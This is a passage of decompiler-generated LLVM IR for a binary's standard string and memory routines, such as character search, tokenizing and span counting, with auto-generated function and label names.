dec_label_pc_19ddc:                               ; preds = %dec_label_pc_19dc8
  %v1_19ddc = add i32 %v0_19dd059, 2
  %v2_19ddc = inttoptr i32 %v1_19ddc to i8*
  %v3_19ddc = load i8, i8* %v2_19ddc, align 1
  %v4_19ddc = zext i8 %v3_19ddc to i32
  %v9_19de0 = icmp eq i32 %v4_19ddc, %v1_19d54
  br i1 %v9_19de0, label %dec_label_pc_19e30, label %dec_label_pc_19dec

dec_label_pc_19dec:                               ; preds = %dec_label_pc_19ddc
  %v2_19dec = inttoptr i32 %v1_19dc0 to i8*
  %v3_19dec = load i8, i8* %v2_19dec, align 1
  %v4_19dec = zext i8 %v3_19dec to i32
  %v9_19df0 = icmp eq i32 %v4_19dec, %v1_19d54
  br i1 %v9_19df0, label %bb36, label %dec_label_pc_19dfc.backedge

bb36:                                             ; preds = %dec_label_pc_19dec
  br label %dec_label_pc_19e30

dec_label_pc_19e24.preheader:                     ; preds = %dec_label_pc_19dfc.backedge, %dec_label_pc_19d80
  %v0_19dd0.lcssa = phi i32 [ %v0_19d84, %dec_label_pc_19d80 ], [ %v4_19d90, %dec_label_pc_19dfc.backedge ]
  %v0_19dac.lcssa = phi i32 [ %v0_19dfc22, %dec_label_pc_19d80 ], [ %v1_19dac, %dec_label_pc_19dfc.backedge ]
  %v2_19e247 = icmp eq i32 %v0_19dac.lcssa, 0
  br i1 %v2_19e247, label %dec_label_pc_19e2c, label %dec_label_pc_19e14

dec_label_pc_19e14:                               ; preds = %dec_label_pc_19e20, %dec_label_pc_19e24.preheader
  %v0_19e24.in = phi i32 [ %v0_19e24, %dec_label_pc_19e20 ], [ %v0_19dac.lcssa, %dec_label_pc_19e24.preheader ]
  %v0_19e20 = phi i32 [ %v1_19e20, %dec_label_pc_19e20 ], [ %v0_19dd0.lcssa, %dec_label_pc_19e24.preheader ]
  %v0_19e24 = add i32 %v0_19e24.in, -1
  %v1_19e14 = inttoptr i32 %v0_19e20 to i8*
  %v2_19e14 = load i8, i8* %v1_19e14, align 1
  %v3_19e14 = zext i8 %v2_19e14 to i32
  %v9_19e18 = icmp eq i32 %v3_19e14, %v1_19d54
  br i1 %v9_19e18, label %dec_label_pc_19e30, label %dec_label_pc_19e20

dec_label_pc_19e20:                               ; preds = %dec_label_pc_19e14
  %v1_19e20 = add i32 %v0_19e20, 1
  %v2_19e24 = icmp eq i32 %v0_19e24, 0
  br i1 %v2_19e24, label %dec_label_pc_19e2c, label %dec_label_pc_19e14

dec_label_pc_19e2c:                               ; preds = %dec_label_pc_19e20, %dec_label_pc_19e24.preheader
  br label %dec_label_pc_19e30

dec_label_pc_19e30:                               ; preds = %dec_label_pc_19d5c, %dec_label_pc_19ddc, %dec_label_pc_19db4, %dec_label_pc_19e14, %bb36, %bb, %dec_label_pc_19e2c
  %v1_19e34 = phi i32 [ 0, %dec_label_pc_19e2c ], [ %v1_19dc8, %bb ], [ %v1_19dc0, %bb36 ], [ %v0_19e20, %dec_label_pc_19e14 ], [ %v1_19ddc, %dec_label_pc_19ddc ], [ %v0_19dd059, %dec_label_pc_19db4 ], [ %v0_19d6c, %dec_label_pc_19d5c ]
  ret i32 %v1_19e34

; uselistorder directives
  uselistorder i32 %v1_19dac, { 1, 0, 2 }
  uselistorder i32 %v0_19dd059, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_19d80, { 1, 0 }
  uselistorder i32 %v0_19dfc22, { 1, 2, 0 }
  uselistorder i32 %v0_19d6c, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_19d84.pre, { 1, 0 }
  uselistorder i32 %v1_19d54, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder label %dec_label_pc_19e30, { 6, 3, 4, 1, 5, 2, 0 }
  uselistorder label %dec_label_pc_19dfc.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_19d90, { 1, 0 }
  uselistorder label %dec_label_pc_19d80, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19d78, { 1, 0 }
}

define i32 @function_19e40() local_unnamed_addr {
dec_label_pc_19e40:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_19e40 = load i32, i32* @r4, align 4
  store i32 %v3_19e40, i32* %stack_var_-16, align 4
  %v0_19e44 = load i32, i32* @r0, align 4
  store i32 %v0_19e44, i32* %r4.global-to-local, align 4
  %v2_19e44 = icmp eq i32 %v0_19e44, 0
  %v1_19e48 = load i32, i32* @r2, align 4
  br i1 %v2_19e44, label %bb, label %dec_label_pc_19e40._crit_edge

bb:                                               ; preds = %dec_label_pc_19e40
  %v2_19e48 = inttoptr i32 %v1_19e48 to i32*
  %v3_19e48 = load i32, i32* %v2_19e48, align 4
  store i32 %v3_19e48, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_19e40._crit_edge

dec_label_pc_19e40._crit_edge:                    ; preds = %dec_label_pc_19e40, %bb
  %v0_19e4c = phi i32 [ %v3_19e48, %bb ], [ %v0_19e44, %dec_label_pc_19e40 ]
  store i32 %v0_19e4c, i32* @r0, align 4
  store i32 %v1_19e48, i32* %r5.global-to-local, align 4
  %v0_19e54 = load i32, i32* @r1, align 4
  store i32 %v0_19e54, i32* %r6.global-to-local, align 4
  %v1_19e58 = inttoptr i32 %v0_19e4c to i8*
  %v2_19e58 = call i32 @function_1a08c(i8* %v1_19e58)
  %v0_19e5c = load i32, i32* %r4.global-to-local, align 4
  %v2_19e5c = add i32 %v0_19e5c, %v2_19e58
  %v3_19e5c = inttoptr i32 %v2_19e5c to i8*
  %v4_19e5c = load i8, i8* %v3_19e5c, align 1
  %v6_19e5c = zext i8 %v4_19e5c to i32
  store i32 %v6_19e5c, i32* %r3.global-to-local, align 4
  store i32 %v2_19e5c, i32* @r4, align 4
  %v2_19e64 = icmp eq i8 %v4_19e5c, 0
  br i1 %v2_19e64, label %bb8, label %dec_label_pc_19e70

bb8:                                              ; preds = %dec_label_pc_19e40._crit_edge
  %v2_19e68 = load i32, i32* %r5.global-to-local, align 4
  %v3_19e68 = inttoptr i32 %v2_19e68 to i32*
  store i32 %v2_19e5c, i32* %v3_19e68, align 4
  br label %dec_label_pc_19eac

dec_label_pc_19e70:                               ; preds = %dec_label_pc_19e40._crit_edge
  %v0_19e70 = load i32, i32* %r6.global-to-local, align 4
  %v3_19e78 = call i32 @function_1a238(i8* %v3_19e5c, i32 %v0_19e70)
  %v3_19e7c = icmp eq i32 %v3_19e78, 0
  br i1 %v3_19e7c, label %dec_label_pc_19e84, label %dec_label_pc_19e9c

dec_label_pc_19e84:                               ; preds = %dec_label_pc_19e70
  %v0_19e88 = load i32, i32* @r4, align 4
  store i32 %v0_19e88, i32* @r0, align 4
  %v2_19e8c = call i32 @function_19efc(i32 %v0_19e88, i32 0)
  %v0_19e90 = load i32, i32* @r4, align 4
  store i32 %v0_19e90, i32* %r3.global-to-local, align 4
  %v1_19e94 = load i32, i32* %r5.global-to-local, align 4
  %v2_19e94 = inttoptr i32 %v1_19e94 to i32*
  store i32 %v2_19e8c, i32* %v2_19e94, align 4
  br label %dec_label_pc_19eac

dec_label_pc_19e9c:                               ; preds = %dec_label_pc_19e70
  %v4_19e78 = inttoptr i32 %v3_19e78 to i8*
  store i8 0, i8* %v4_19e78, align 1
  %v7_19ea0 = add i32 %v3_19e78, 1
  %v1_19ea4 = load i32, i32* %r5.global-to-local, align 4
  %v2_19ea4 = inttoptr i32 %v1_19ea4 to i32*
  store i32 %v7_19ea0, i32* %v2_19ea4, align 4
  %v0_19ea8 = load i32, i32* @r4, align 4
  store i32 %v0_19ea8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_19eac

dec_label_pc_19eac:                               ; preds = %bb8, %dec_label_pc_19e84, %dec_label_pc_19e9c
  %v0_19eac = load i32, i32* %r3.global-to-local, align 4
  %v2_19eb0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_19eb0, i32* @r4, align 4
  ret i32 %v0_19eac

; uselistorder directives
  uselistorder i32 %v3_19e78, { 0, 2, 1 }
  uselistorder i32 %v0_19e4c, { 1, 0 }
  uselistorder i32 %v0_19e44, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_19eac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19e40._crit_edge, { 1, 0 }
}

define i32 @function_19eb8() local_unnamed_addr {
dec_label_pc_19eb8:
  %stack_var_-16 = alloca i32, align 4
  %v3_19eb8 = load i32, i32* @r4, align 4
  store i32 %v3_19eb8, i32* %stack_var_-16, align 4
  %v6_19eb8 = load i32, i32* @r5, align 4
  %v9_19eb8 = load i32, i32* @r6, align 4
  %v0_19ebc = load i32, i32* @r0, align 4
  %v0_19ec0 = load i32, i32* @r1, align 4
  store i32 %v0_19ec0, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_19edc8 = inttoptr i32 %v0_19ebc to i8*
  %v2_19edc9 = load i8, i8* %v1_19edc8, align 1
  %v2_19ee011 = icmp eq i8 %v2_19edc9, 0
  store i32 %v0_19ec0, i32* @r0, align 4
  %v1_19ee812 = add i32 %v0_19ebc, 1
  store i32 %v1_19ee812, i32* @r4, align 4
  br i1 %v2_19ee011, label %dec_label_pc_19ef0, label %dec_label_pc_19ecc

dec_label_pc_19ecc:                               ; preds = %dec_label_pc_19eb8, %dec_label_pc_19ed8
  %v3_19edc14.in = phi i8 [ %v2_19edc, %dec_label_pc_19ed8 ], [ %v2_19edc9, %dec_label_pc_19eb8 ]
  %v0_19ee413 = phi i32 [ %v0_19ee4.pre, %dec_label_pc_19ed8 ], [ %v0_19ec0, %dec_label_pc_19eb8 ]
  %v3_19edc14 = zext i8 %v3_19edc14.in to i32
  %v2_19ecc = call i32 @function_142f0(i32 %v0_19ee413, i32 %v3_19edc14)
  %v2_19ed0 = icmp eq i32 %v2_19ecc, 0
  %v0_19ed8 = load i32, i32* @r5, align 4
  br i1 %v2_19ed0, label %dec_label_pc_19ed8, label %dec_label_pc_19ef0

dec_label_pc_19ed8:                               ; preds = %dec_label_pc_19ecc
  %v1_19ed8 = add i32 %v0_19ed8, 1
  %v0_19edc.pre = load i32, i32* @r4, align 4
  %v0_19ee4.pre = load i32, i32* @r6, align 4
  store i32 %v1_19ed8, i32* @r5, align 4
  %v1_19edc = inttoptr i32 %v0_19edc.pre to i8*
  %v2_19edc = load i8, i8* %v1_19edc, align 1
  %v2_19ee0 = icmp eq i8 %v2_19edc, 0
  store i32 %v0_19ee4.pre, i32* @r0, align 4
  %v1_19ee8 = add i32 %v0_19edc.pre, 1
  store i32 %v1_19ee8, i32* @r4, align 4
  br i1 %v2_19ee0, label %dec_label_pc_19ef0, label %dec_label_pc_19ecc

dec_label_pc_19ef0:                               ; preds = %dec_label_pc_19ed8, %dec_label_pc_19ecc, %dec_label_pc_19eb8
  %v0_19ef0 = phi i32 [ 0, %dec_label_pc_19eb8 ], [ %v0_19ed8, %dec_label_pc_19ecc ], [ %v1_19ed8, %dec_label_pc_19ed8 ]
  %v2_19ef4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_19ef4, i32* @r4, align 4
  store i32 %v6_19eb8, i32* @r5, align 4
  store i32 %v9_19eb8, i32* @r6, align 4
  ret i32 %v0_19ef0

; uselistorder directives
  uselistorder i8 %v2_19edc, { 1, 0 }
  uselistorder i32 %v0_19ee4.pre, { 1, 0 }
  uselistorder i32 %v0_19edc.pre, { 1, 0 }
  uselistorder label %dec_label_pc_19ecc, { 1, 0 }
}

define i32 @function_19efc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_19efc:
  %v1_19f00 = urem i32 %arg1, 256
  %v0_19f182 = load i32, i32* @r0, align 4
  %v1_19f183 = urem i32 %v0_19f182, 4
  %v2_19f184 = icmp eq i32 %v1_19f183, 0
  br i1 %v2_19f184, label %dec_label_pc_19f20, label %dec_label_pc_19f08

dec_label_pc_19f08:                               ; preds = %dec_label_pc_19efc, %dec_label_pc_19f14
  %v0_19f14 = phi i32 [ %v1_19f14, %dec_label_pc_19f14 ], [ %v0_19f182, %dec_label_pc_19efc ]
  %v1_19f08 = inttoptr i32 %v0_19f14 to i8*
  %v2_19f08 = load i8, i8* %v1_19f08, align 1
  %v3_19f08 = zext i8 %v2_19f08 to i32
  %v9_19f0c = icmp eq i32 %v3_19f08, %v1_19f00
  br i1 %v9_19f0c, label %dec_label_pc_19f9c, label %dec_label_pc_19f14

dec_label_pc_19f14:                               ; preds = %dec_label_pc_19f08
  %v1_19f14 = add i32 %v0_19f14, 1
  %v1_19f18 = urem i32 %v1_19f14, 4
  %v2_19f18 = icmp eq i32 %v1_19f18, 0
  br i1 %v2_19f18, label %dec_label_pc_19f20, label %dec_label_pc_19f08

dec_label_pc_19f20:                               ; preds = %dec_label_pc_19f14, %dec_label_pc_19efc
  %v0_19f24 = phi i32 [ %v0_19f182, %dec_label_pc_19efc ], [ %v1_19f14, %dec_label_pc_19f14 ]
  %v4_19f20 = mul nuw nsw i32 %v1_19f00, 256
  %v5_19f20 = or i32 %v4_19f20, %v1_19f00
  %v4_19f28 = mul i32 %v5_19f20, 65536
  %v5_19f28 = or i32 %v4_19f28, %v5_19f20
  br label %dec_label_pc_19f2c

dec_label_pc_19f2c:                               ; preds = %dec_label_pc_19f8c, %dec_label_pc_19f2c, %dec_label_pc_19f20
  %v0_19f70 = phi i32 [ %v0_19f24, %dec_label_pc_19f20 ], [ %v4_19f2c, %dec_label_pc_19f2c ], [ %v4_19f2c, %dec_label_pc_19f8c ]
  %v1_19f2c = inttoptr i32 %v0_19f70 to i32*
  %v2_19f2c = load i32, i32* %v1_19f2c, align 4
  %v4_19f2c = add i32 %v0_19f70, 4
  %v2_19f34 = xor i32 %v2_19f2c, %v5_19f28
  %v2_19f38 = add i32 %v2_19f34, 2130640639
  %v1_19f40 = sub i32 -1, %v2_19f34
  %v2_19f44 = xor i32 %v2_19f38, %v1_19f40
  %v2_19f48 = and i32 %v2_19f44, -2130640640
  %v2_19f4c = icmp eq i32 %v2_19f48, 0
  br i1 %v2_19f4c, label %dec_label_pc_19f2c, label %dec_label_pc_19f54

dec_label_pc_19f54:                               ; preds = %dec_label_pc_19f2c
  %v2_19f54 = inttoptr i32 %v0_19f70 to i8*
  %v3_19f54 = load i8, i8* %v2_19f54, align 1
  %v4_19f54 = zext i8 %v3_19f54 to i32
  %v9_19f5c = icmp eq i32 %v4_19f54, %v1_19f00
  %v1_19f60 = add i32 %v0_19f70, 3
  br i1 %v9_19f5c, label %dec_label_pc_19f9c, label %dec_label_pc_19f68

dec_label_pc_19f68:                               ; preds = %dec_label_pc_19f54
  %v1_19f68 = add i32 %v0_19f70, 1
  %v2_19f68 = inttoptr i32 %v1_19f68 to i8*
  %v3_19f68 = load i8, i8* %v2_19f68, align 1
  %v4_19f68 = zext i8 %v3_19f68 to i32
  %v9_19f6c = icmp eq i32 %v4_19f68, %v1_19f00
  br i1 %v9_19f6c, label %bb, label %dec_label_pc_19f7c

bb:                                               ; preds = %dec_label_pc_19f68
  br label %dec_label_pc_19f9c

dec_label_pc_19f7c:                               ; preds = %dec_label_pc_19f68
  %v1_19f7c = add i32 %v0_19f70, 2
  %v2_19f7c = inttoptr i32 %v1_19f7c to i8*
  %v3_19f7c = load i8, i8* %v2_19f7c, align 1
  %v4_19f7c = zext i8 %v3_19f7c to i32
  %v9_19f80 = icmp eq i32 %v4_19f7c, %v1_19f00
  br i1 %v9_19f80, label %dec_label_pc_19f9c, label %dec_label_pc_19f8c

dec_label_pc_19f8c:                               ; preds = %dec_label_pc_19f7c
  %v2_19f8c = inttoptr i32 %v1_19f60 to i8*
  %v3_19f8c = load i8, i8* %v2_19f8c, align 1
  %v4_19f8c = zext i8 %v3_19f8c to i32
  %v9_19f90 = icmp eq i32 %v4_19f8c, %v1_19f00
  br i1 %v9_19f90, label %dec_label_pc_19f98, label %dec_label_pc_19f2c

dec_label_pc_19f98:                               ; preds = %dec_label_pc_19f8c
  br label %dec_label_pc_19f9c

dec_label_pc_19f9c:                               ; preds = %dec_label_pc_19f08, %dec_label_pc_19f7c, %dec_label_pc_19f54, %bb, %dec_label_pc_19f98
  %v1_19fa0 = phi i32 [ %v1_19f60, %dec_label_pc_19f98 ], [ %v1_19f68, %bb ], [ %v1_19f7c, %dec_label_pc_19f7c ], [ %v0_19f70, %dec_label_pc_19f54 ], [ %v0_19f14, %dec_label_pc_19f08 ]
  ret i32 %v1_19fa0

; uselistorder directives
  uselistorder i32 %v4_19f2c, { 1, 0 }
  uselistorder i32 %v0_19f70, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_19f20, { 1, 0 }
  uselistorder i32 %v1_19f14, { 1, 0, 2 }
  uselistorder i32 %v0_19f182, { 2, 1, 0 }
  uselistorder i32 %v1_19f00, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_19f9c, { 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_19f08, { 1, 0 }
}

define i32 @function_19fac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_19fac:
  %v1_19fb0 = urem i32 %arg2, 256
  %v2_19fb4 = add i32 %arg3, %arg1
  %v2_19fcc4 = icmp eq i32 %arg3, 0
  br i1 %v2_19fcc4, label %dec_label_pc_19fdc, label %dec_label_pc_19fd4

dec_label_pc_19fbc:                               ; preds = %dec_label_pc_19fd4
  %v1_19fbc = add i32 %v0_19fbc, -1
  %v2_19fbc = inttoptr i32 %v1_19fbc to i8*
  %v3_19fbc = load i8, i8* %v2_19fbc, align 1
  %v4_19fbc = zext i8 %v3_19fbc to i32
  %v9_19fc0 = icmp eq i32 %v4_19fbc, %v1_19fb0
  br i1 %v9_19fc0, label %dec_label_pc_1a07c, label %dec_label_pc_19fc8

dec_label_pc_19fc8:                               ; preds = %dec_label_pc_19fbc
  %v1_19fc8 = add i32 %v0_19fc8, -1
  %v2_19fcc = icmp eq i32 %v1_19fc8, 0
  br i1 %v2_19fcc, label %dec_label_pc_19fdc, label %dec_label_pc_19fd4

dec_label_pc_19fd4:                               ; preds = %dec_label_pc_19fac, %dec_label_pc_19fc8
  %v0_19fc8 = phi i32 [ %v1_19fc8, %dec_label_pc_19fc8 ], [ %arg3, %dec_label_pc_19fac ]
  %v0_19fbc = phi i32 [ %v1_19fbc, %dec_label_pc_19fc8 ], [ %v2_19fb4, %dec_label_pc_19fac ]
  %v1_19fd4 = urem i32 %v0_19fbc, 4
  %v2_19fd4 = icmp eq i32 %v1_19fd4, 0
  br i1 %v2_19fd4, label %dec_label_pc_19fdc, label %dec_label_pc_19fbc

dec_label_pc_19fdc:                               ; preds = %dec_label_pc_19fc8, %dec_label_pc_19fd4, %dec_label_pc_19fac
  %v0_1a06413 = phi i32 [ %v2_19fb4, %dec_label_pc_19fac ], [ %v1_19fbc, %dec_label_pc_19fc8 ], [ %v0_19fbc, %dec_label_pc_19fd4 ]
  %v0_1a0509 = phi i32 [ 0, %dec_label_pc_19fac ], [ 0, %dec_label_pc_19fc8 ], [ %v0_19fc8, %dec_label_pc_19fd4 ]
  %v4_19fdc = mul nuw nsw i32 %v1_19fb0, 256
  %v5_19fdc = or i32 %v4_19fdc, %v1_19fb0
  %v4_19fe0 = mul i32 %v5_19fdc, 65536
  %v5_19fe0 = or i32 %v4_19fe0, %v5_19fdc
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_1a0509, 3
  br i1 %tmp, label %dec_label_pc_19fe8, label %dec_label_pc_1a070

dec_label_pc_19fe8:                               ; preds = %dec_label_pc_19fdc, %dec_label_pc_1a050.backedge
  %v0_1a00440 = phi i32 [ %v1_1a004, %dec_label_pc_1a050.backedge ], [ %v0_1a0509, %dec_label_pc_19fdc ]
  %v0_19fe839 = phi i32 [ %v1_19fe8, %dec_label_pc_1a050.backedge ], [ %v0_1a06413, %dec_label_pc_19fdc ]
  %v1_19fe8 = add i32 %v0_19fe839, -4
  %v2_19fe8 = inttoptr i32 %v1_19fe8 to i32*
  %v3_19fe8 = load i32, i32* %v2_19fe8, align 4
  %v2_19fec = xor i32 %v3_19fe8, %v5_19fe0
  %v2_19ff0 = add i32 %v2_19fec, 2130640639
  store i32 %v2_19ff0, i32* @ip, align 4
  %v1_19ff4 = sub i32 -1, %v2_19fec
  %v2_19ff8 = xor i32 %v2_19ff0, %v1_19ff4
  %v2_19ffc = and i32 %v2_19ff8, -2130640640
  %v2_1a000 = icmp eq i32 %v2_19ffc, 0
  %v1_1a004 = add i32 %v0_1a00440, -4
  br i1 %v2_1a000, label %dec_label_pc_1a050.backedge, label %dec_label_pc_1a00c

dec_label_pc_1a050.backedge:                      ; preds = %dec_label_pc_19fe8, %dec_label_pc_1a044
  store i32 2130640639, i32* @ip, align 4
  %tmp46 = icmp ugt i32 %v1_1a004, 3
  br i1 %tmp46, label %dec_label_pc_19fe8, label %dec_label_pc_1a070

dec_label_pc_1a00c:                               ; preds = %dec_label_pc_19fe8
  %v1_1a00c = add i32 %v0_19fe839, -1
  %v2_1a00c = inttoptr i32 %v1_1a00c to i8*
  %v3_1a00c = load i8, i8* %v2_1a00c, align 1
  %v4_1a00c = zext i8 %v3_1a00c to i32
  %v9_1a010 = icmp eq i32 %v4_1a00c, %v1_19fb0
  br i1 %v9_1a010, label %dec_label_pc_1a03c, label %dec_label_pc_1a01c

dec_label_pc_1a01c:                               ; preds = %dec_label_pc_1a00c
  %v1_1a01c = add i32 %v0_19fe839, -2
  %v2_1a01c = inttoptr i32 %v1_1a01c to i8*
  %v3_1a01c = load i8, i8* %v2_1a01c, align 1
  %v4_1a01c = zext i8 %v3_1a01c to i32
  %v9_1a020 = icmp eq i32 %v4_1a01c, %v1_19fb0
  br i1 %v9_1a020, label %dec_label_pc_1a03c, label %dec_label_pc_1a02c

dec_label_pc_1a02c:                               ; preds = %dec_label_pc_1a01c
  %v1_1a02c = add i32 %v0_19fe839, -3
  %v2_1a02c = inttoptr i32 %v1_1a02c to i8*
  %v3_1a02c = load i8, i8* %v2_1a02c, align 1
  %v4_1a02c = zext i8 %v3_1a02c to i32
  %v9_1a030 = icmp eq i32 %v4_1a02c, %v1_19fb0
  br i1 %v9_1a030, label %dec_label_pc_1a03c, label %dec_label_pc_1a044

dec_label_pc_1a03c:                               ; preds = %dec_label_pc_1a02c, %dec_label_pc_1a01c, %dec_label_pc_1a00c
  %v0_1a03c = phi i32 [ %v1_1a02c, %dec_label_pc_1a02c ], [ %v1_1a01c, %dec_label_pc_1a01c ], [ %v1_1a00c, %dec_label_pc_1a00c ]
  br label %dec_label_pc_1a07c

dec_label_pc_1a044:                               ; preds = %dec_label_pc_1a02c
  %v1_1a044 = inttoptr i32 %v1_19fe8 to i8*
  %v2_1a044 = load i8, i8* %v1_1a044, align 1
  %v3_1a044 = zext i8 %v2_1a044 to i32
  %v9_1a048 = icmp eq i32 %v3_1a044, %v1_19fb0
  br i1 %v9_1a048, label %dec_label_pc_1a07c, label %dec_label_pc_1a050.backedge

dec_label_pc_1a064:                               ; preds = %dec_label_pc_1a070
  %v1_1a070 = add i32 %v0_1a070, -1
  %v1_1a064 = add i32 %v0_1a064, -1
  %v2_1a064 = inttoptr i32 %v1_1a064 to i8*
  %v3_1a064 = load i8, i8* %v2_1a064, align 1
  %v4_1a064 = zext i8 %v3_1a064 to i32
  %v9_1a068 = icmp eq i32 %v4_1a064, %v1_19fb0
  br i1 %v9_1a068, label %dec_label_pc_1a07c, label %dec_label_pc_1a070

dec_label_pc_1a070:                               ; preds = %dec_label_pc_19fdc, %dec_label_pc_1a050.backedge, %dec_label_pc_1a064
  %v0_1a064 = phi i32 [ %v1_1a064, %dec_label_pc_1a064 ], [ %v0_1a06413, %dec_label_pc_19fdc ], [ %v1_19fe8, %dec_label_pc_1a050.backedge ]
  %v0_1a070 = phi i32 [ %v1_1a070, %dec_label_pc_1a064 ], [ %v0_1a0509, %dec_label_pc_19fdc ], [ %v1_1a004, %dec_label_pc_1a050.backedge ]
  %v2_1a070 = icmp eq i32 %v0_1a070, 0
  br i1 %v2_1a070, label %dec_label_pc_1a078, label %dec_label_pc_1a064

dec_label_pc_1a078:                               ; preds = %dec_label_pc_1a070
  br label %dec_label_pc_1a07c

dec_label_pc_1a07c:                               ; preds = %dec_label_pc_19fbc, %dec_label_pc_1a044, %dec_label_pc_1a064, %dec_label_pc_1a03c, %dec_label_pc_1a078
  %v1_1a080 = phi i32 [ %v0_1a03c, %dec_label_pc_1a03c ], [ 0, %dec_label_pc_1a078 ], [ %v1_1a064, %dec_label_pc_1a064 ], [ %v1_19fe8, %dec_label_pc_1a044 ], [ %v1_19fbc, %dec_label_pc_19fbc ]
  ret i32 %v1_1a080

; uselistorder directives
  uselistorder i32 %v0_1a070, { 1, 0 }
  uselistorder i32 %v1_1a004, { 1, 0, 2 }
  uselistorder i32 %v1_19fe8, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_19fe839, { 3, 2, 1, 0 }
  uselistorder i32 %v5_19fdc, { 1, 0 }
  uselistorder i32 %v0_1a0509, { 1, 2, 0 }
  uselistorder i32 %v0_19fbc, { 1, 0, 2 }
  uselistorder i32 %v2_19fb4, { 1, 0 }
  uselistorder i32 %v1_19fb0, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a07c, { 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_1a070, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a050.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_19fe8, { 1, 0 }
  uselistorder label %dec_label_pc_19fdc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19fd4, { 1, 0 }
}

define i32 @function_1a08c(i8* %arg1) local_unnamed_addr {
dec_label_pc_1a08c:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1a0bc2 = load i32, i32* @r0, align 4
  %v1_1a0bc3 = inttoptr i32 %v0_1a0bc2 to i8*
  %v2_1a0bc4 = load i8, i8* %v1_1a0bc3, align 1
  %v3_1a0bc5 = zext i8 %v2_1a0bc4 to i32
  store i32 %v3_1a0bc5, i32* @ip, align 4
  %v2_1a0c06 = icmp eq i8 %v2_1a0bc4, 0
  br i1 %v2_1a0c06, label %dec_label_pc_1a0cc, label %dec_label_pc_1a0a0.preheader

dec_label_pc_1a098:                               ; preds = %dec_label_pc_1a0a0
  %v3_1a0a0 = zext i8 %v2_1a0a0 to i32
  %v1_1a0a8 = add i32 %v0_1a0a8, 1
  %v9_1a098 = icmp eq i32 %v0_1a09810, %v3_1a0a0
  br i1 %v9_1a098, label %dec_label_pc_1a0b4, label %dec_label_pc_1a0a0

dec_label_pc_1a0a0:                               ; preds = %dec_label_pc_1a0a0.preheader, %dec_label_pc_1a098
  %v0_1a0a8 = phi i32 [ %tmp, %dec_label_pc_1a0a0.preheader ], [ %v1_1a0a8, %dec_label_pc_1a098 ]
  %v1_1a0a0 = inttoptr i32 %v0_1a0a8 to i8*
  %v2_1a0a0 = load i8, i8* %v1_1a0a0, align 1
  %v2_1a0a4 = icmp eq i8 %v2_1a0a0, 0
  br i1 %v2_1a0a4, label %dec_label_pc_1a0cc, label %dec_label_pc_1a098

dec_label_pc_1a0b4:                               ; preds = %dec_label_pc_1a098
  %v1_1a0b4 = add i32 %v0_1a0b4, 1
  %v1_1a0b8 = add i32 %v0_1a0b8, 1
  %v1_1a0bc = inttoptr i32 %v1_1a0b8 to i8*
  %v2_1a0bc = load i8, i8* %v1_1a0bc, align 1
  %v3_1a0bc = zext i8 %v2_1a0bc to i32
  store i32 %v3_1a0bc, i32* @ip, align 4
  %v2_1a0c0 = icmp eq i8 %v2_1a0bc, 0
  br i1 %v2_1a0c0, label %dec_label_pc_1a0cc, label %dec_label_pc_1a0a0.preheader

dec_label_pc_1a0a0.preheader:                     ; preds = %dec_label_pc_1a08c, %dec_label_pc_1a0b4
  %v0_1a0b8 = phi i32 [ %v1_1a0b8, %dec_label_pc_1a0b4 ], [ %v0_1a0bc2, %dec_label_pc_1a08c ]
  %v0_1a0b4 = phi i32 [ %v1_1a0b4, %dec_label_pc_1a0b4 ], [ 0, %dec_label_pc_1a08c ]
  %v0_1a09810 = phi i32 [ %v3_1a0bc, %dec_label_pc_1a0b4 ], [ %v3_1a0bc5, %dec_label_pc_1a08c ]
  br label %dec_label_pc_1a0a0

dec_label_pc_1a0cc:                               ; preds = %dec_label_pc_1a0b4, %dec_label_pc_1a0a0, %dec_label_pc_1a08c
  %v0_1a0cc = phi i32 [ 0, %dec_label_pc_1a08c ], [ %v0_1a0b4, %dec_label_pc_1a0a0 ], [ %v1_1a0b4, %dec_label_pc_1a0b4 ]
  ret i32 %v0_1a0cc

; uselistorder directives
  uselistorder i32 %v0_1a0a8, { 1, 0 }
  uselistorder label %dec_label_pc_1a0a0.preheader, { 1, 0 }
}

define i32 @function_1a0d8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1a0d8:
  store i32 %arg1, i32* @r0, align 4
  %v1_1a0dc = urem i32 %arg2, 256
  store i32 %v1_1a0dc, i32* @r4, align 4
  %v2_1a0dc = icmp eq i32 %v1_1a0dc, 0
  br i1 %v2_1a0dc, label %dec_label_pc_1a0f0, label %dec_label_pc_1a104.preheader

dec_label_pc_1a104.preheader:                     ; preds = %dec_label_pc_1a0d8
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
